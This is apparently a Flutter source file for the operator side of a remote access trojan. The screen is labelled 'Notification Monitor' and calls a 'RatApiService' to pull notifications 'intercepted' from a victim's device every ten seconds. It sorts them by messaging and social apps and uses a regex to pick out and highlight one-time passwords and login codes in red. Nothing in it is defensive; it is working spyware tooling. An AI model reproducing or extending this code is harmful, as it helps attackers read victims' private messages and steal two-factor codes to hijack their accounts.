import 'dart:async';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'api_service.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _NotifGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _NotifGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

const _kBg   = Color(0xFF111827);
const _kCard = Color(0xFF1F2937);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kRed  = Color(0xFFEF4444);
const _kSub  = Color(0xFF9CA3AF);

class NotificationMonitorScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const NotificationMonitorScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<NotificationMonitorScreen> createState() => _NotificationMonitorScreenState();
}

class _NotificationMonitorScreenState extends State<NotificationMonitorScreen> {
  late RatApiService _api;
  List<dynamic> _all = [];
  Timer? _timer;
  bool _isLoading = true;
  String _filter = 'All';
  final List<String> _filters = ['All', 'OTP', 'WhatsApp', 'Telegram', 'Instagram', 'Gmail', 'TikTok', 'SMS'];

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _fetch();
    _timer = Timer.periodic(const Duration(seconds: 10), (_) => _fetch(silent: true));
  }

  @override
  void dispose() { _timer?.cancel(); super.dispose(); }

  Future<void> _fetch({bool silent = false}) async {
    try {
      if (!silent) setState(() => _isLoading = true);
      final r = await _api.getNotifications(widget.deviceId);
      if (mounted) {
        setState(() {
          if (r is Map) _all = r.values.toList();
          else if (r is List) _all = r;
          else _all = [];
          _isLoading = false;
        });
      }
    } catch (_) { if (mounted) setState(() => _isLoading = false); }
  }

  List<dynamic> get _filtered {
    if (_filter == 'All') return _all;
    return _all.where((n) {
      final pkg = (n['package_name'] ?? '').toString().toLowerCase();
      final title = (n['title'] ?? '').toString().toLowerCase();
      final body = (n['content'] ?? '').toString().toLowerCase();
      if (_filter == 'OTP') return _isOtp(title, body);
      if (_filter == 'WhatsApp') return pkg.contains('whatsapp');
      if (_filter == 'Telegram') return pkg.contains('telegram');
      if (_filter == 'Instagram') return pkg.contains('instagram');
      if (_filter == 'TikTok') return pkg.contains('zhiliaoapp') || pkg.contains('tiktok');
      if (_filter == 'Gmail') return pkg.contains('android.gm') || pkg.contains('gmail');
      if (_filter == 'SMS') return pkg.contains('mms') || pkg.contains('sms') || pkg.contains('messaging');
      return false;
    }).toList();
  }

  bool _isOtp(String t, String c) => RegExp(r'(otp|code|kode|verif|auth|pin|login)', caseSensitive: false).hasMatch(t) || RegExp(r'(otp|code|kode|verif|auth|pin|login)', caseSensitive: false).hasMatch(c);

  Map<String, dynamic> _appStyle(String pkg) {
    if (pkg.contains('whatsapp')) return {'icon': FontAwesomeIcons.whatsapp, 'color': const Color(0xFF25D366)};
    if (pkg.contains('telegram')) return {'icon': FontAwesomeIcons.telegram, 'color': const Color(0xFF26A5E4)};
    if (pkg.contains('instagram')) return {'icon': FontAwesomeIcons.instagram, 'color': const Color(0xFFE1306C)};
    if (pkg.contains('facebook')) return {'icon': FontAwesomeIcons.facebook, 'color': const Color(0xFF1877F2)};
    if (pkg.contains('tiktok') || pkg.contains('zhiliaoapp')) return {'icon': FontAwesomeIcons.tiktok, 'color': Colors.pink};
    if (pkg.contains('android.gm') || pkg.contains('gmail')) return {'icon': FontAwesomeIcons.google, 'color': _kRed};
    if (pkg.contains('mms') || pkg.contains('sms') || pkg.contains('messaging')) return {'icon': FontAwesomeIcons.commentDots, 'color': const Color(0xFFF59E0B)};
    return {'icon': FontAwesomeIcons.bell, 'color': _kSub};
  }

  String _appName(String pkg) {
    if (pkg.contains('whatsapp')) return 'WhatsApp';
    if (pkg.contains('telegram')) return 'Telegram';
    if (pkg.contains('instagram')) return 'Instagram';
    if (pkg.contains('facebook')) return 'Facebook';
    if (pkg.contains('tiktok')) return 'TikTok';
    if (pkg.contains('android.gm')) return 'Gmail';
    if (pkg.contains('sms') || pkg.contains('mms')) return 'SMS';
    return pkg.length > 20 ? '${pkg.substring(0, 20)}...' : pkg;
  }

  String _time(dynamic ts) {
    if (ts == null) return '';
    try {
      final d = DateTime.parse(ts.toString());
      return '${d.hour.toString().padLeft(2,'0')}:${d.minute.toString().padLeft(2,'0')} ${d.day}/${d.month}';
    } catch (_) { return ts.toString(); }
  }

  void _showDetail(Map<String, dynamic> n) {
    showDialog(context: context, builder: (ctx) => Dialog(
      backgroundColor: Colors.transparent,
      child: Container(
        decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard, _kBg]), borderRadius: BorderRadius.circular(18), border: Border.all(color: _kBlue.withOpacity(0.3))),
        padding: const EdgeInsets.all(18),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(children: [
            Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.notifications_rounded, color: Colors.white, size: 18)),
            const SizedBox(width: 12),
            Expanded(child: Text(n['title'] ?? 'No Title', style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w700), maxLines: 2, overflow: TextOverflow.ellipsis)),
          ]),
          const SizedBox(height: 12),
          Text('App: ${n['package_name'] ?? 'Unknown'}', style: const TextStyle(color: _kSub, fontSize: 11)),
          const SizedBox(height: 10),
          Container(
            constraints: const BoxConstraints(maxHeight: 280),
            child: SingleChildScrollView(child: SelectableText(n['content'] ?? 'No Content', style: const TextStyle(color: Colors.white, fontSize: 13))),
          ),
          const SizedBox(height: 10),
          Text('Time: ${n['timestamp'] ?? 'N/A'}', style: const TextStyle(color: _kSub, fontSize: 10)),
          const SizedBox(height: 12),
          Align(alignment: Alignment.centerRight, child: GestureDetector(
            onTap: () => Navigator.pop(ctx),
            child: Container(padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(8)), child: const Text('Close', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
          )),
        ]),
      ),
    ));
  }

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _NotifGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final list = _filtered;
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildGridBackground(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.black.withOpacity(0.85),
                  _kBlue.withOpacity(0.05),
                  Colors.black.withOpacity(0.9)
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          SafeArea(
            child: Column(children: [
              // Header
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                child: Row(children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
                  ),
                  const SizedBox(width: 12),
                  Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.notifications_active_rounded, color: Colors.white, size: 18)),
                  const SizedBox(width: 12),
                  Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    const Text('Notification Monitor', style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w700)),
                    Text('${_all.length} intercepted', style: const TextStyle(color: _kSub, fontSize: 11)),
                  ])),
                  GestureDetector(
                    onTap: _fetch,
                    child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.refresh_rounded, color: Colors.white70, size: 18)),
                  ),
                ]),
              ),
              // Filter chips
              Container(
                height: 46,
                margin: const EdgeInsets.only(top: 12),
                padding: const EdgeInsets.symmetric(horizontal: 8),
                child: ListView.separated(
                  scrollDirection: Axis.horizontal,
                  itemCount: _filters.length,
                  separatorBuilder: (_, __) => const SizedBox(width: 6),
                  itemBuilder: (_, i) {
                    final f = _filters[i];
                    final sel = _filter == f;
                    final isOtp = f == 'OTP';
                    return GestureDetector(
                      onTap: () => setState(() => _filter = f),
                      child: AnimatedContainer(
                        duration: const Duration(milliseconds: 200),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
                        decoration: BoxDecoration(
                          gradient: sel ? (isOtp ? const LinearGradient(colors: [_kRed, Color(0xFFDC2626)]) : const LinearGradient(colors: [_kBlue, _kCyan])) : null,
                          color: sel ? null : _kCard.withOpacity(0.6),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: sel ? Colors.transparent : Colors.white12),
                        ),
                        child: Text(f, style: TextStyle(color: sel ? Colors.white : _kSub, fontSize: 12, fontWeight: sel ? FontWeight.w700 : FontWeight.normal)),
                      ),
                    );
                  },
                ),
              ),
              const SizedBox(height: 8),
              // List
              Expanded(
                child: _isLoading
                  ? const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2))
                  : list.isEmpty
                    ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                        Icon(Icons.notifications_off_rounded, size: 56, color: Colors.white.withOpacity(0.1)),
                        const SizedBox(height: 12),
                        const Text('No notifications found', style: TextStyle(color: _kSub)),
                      ]))
                    : ListView.builder(
                        padding: const EdgeInsets.symmetric(horizontal: 14),
                        physics: const BouncingScrollPhysics(),
                        itemCount: list.length,
                        itemBuilder: (_, i) {
                          final n = list[i];
                          if (n is! Map) return const SizedBox.shrink();
                          final title = (n['title'] ?? '').toString();
                          final body  = (n['content'] ?? '').toString();
                          final pkg   = (n['package_name'] ?? 'System').toString();
                          final style = _appStyle(pkg.toLowerCase());
                          final isOtp = _isOtp(title, body);

                          return GestureDetector(
                            onTap: () => _showDetail(Map<String, dynamic>.from(n)),
                            child: Container(
                              margin: const EdgeInsets.only(bottom: 8),
                              decoration: BoxDecoration(
                                gradient: LinearGradient(colors: [_kCard.withOpacity(0.95), _kBg.withOpacity(0.95)]),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(color: isOtp ? _kRed.withOpacity(0.5) : (style['color'] as Color).withOpacity(0.25), width: isOtp ? 1.5 : 1),
                              ),
                              padding: const EdgeInsets.all(12),
                              child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
                                Container(
                                  width: 38, height: 38,
                                  decoration: BoxDecoration(color: (style['color'] as Color).withOpacity(0.1), borderRadius: BorderRadius.circular(10), border: Border.all(color: (style['color'] as Color).withOpacity(0.3))),
                                  child: Center(child: FaIcon(style['icon'], color: style['color'], size: 17)),
                                ),
                                const SizedBox(width: 10),
                                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                                  Row(children: [
                                    Text(_appName(pkg), style: TextStyle(color: style['color'], fontSize: 10, fontWeight: FontWeight.w700)),
                                    const Spacer(),
                                    if (isOtp) Container(margin: const EdgeInsets.only(right: 6), padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1), decoration: BoxDecoration(color: _kRed, borderRadius: BorderRadius.circular(4)), child: const Text('OTP', style: TextStyle(color: Colors.white, fontSize: 8, fontWeight: FontWeight.bold))),
                                    Text(_time(n['timestamp']), style: const TextStyle(color: _kSub, fontSize: 9)),
                                  ]),
                                  const SizedBox(height: 4),
                                  Text(title, style: TextStyle(color: isOtp ? _kRed : Colors.white, fontSize: 12, fontWeight: FontWeight.w600), maxLines: 1, overflow: TextOverflow.ellipsis),
                                  const SizedBox(height: 3),
                                  Text(body, style: const TextStyle(color: Colors.white70, fontSize: 11, height: 1.3), maxLines: 2, overflow: TextOverflow.ellipsis),
                                ])),
                              ]),
                            ),
                          );
                        },
                      ),
              ),
            ]),
          ),
        ],
      ),
    );
  }
}